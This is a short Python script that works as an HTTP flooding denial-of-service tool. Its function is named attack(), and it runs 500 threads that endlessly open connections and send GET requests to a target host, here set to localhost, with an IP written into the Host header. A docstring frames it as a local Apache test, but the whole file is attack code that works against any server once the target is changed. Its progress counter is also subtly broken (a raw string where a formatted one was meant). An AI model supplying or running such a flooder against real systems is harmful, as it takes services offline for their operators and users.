import threading
import socket 

"""
- run an apache http server 
- on local network 
"""

TARGET = "127.0.0.1"
PORT = 80
ip = "182.21.20.32"
connected = 0

def attack(): 
    while True: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))

        s.sendto(("GET /" + TARGET + " HTTP/1.1\r\n").encode("ascii"), (TARGET, PORT))
        s.sendto(("Host: " + ip + "\r\n\r\n").encode("ascii"), (TARGET, PORT))

        s.close()

        global connected   
        connected += 1
        if connected % 100 == 0:
            print(r"Connected: {connected}") 

for i in range(500): 
    thread = threading.Thread(target=attack)
    thread.start()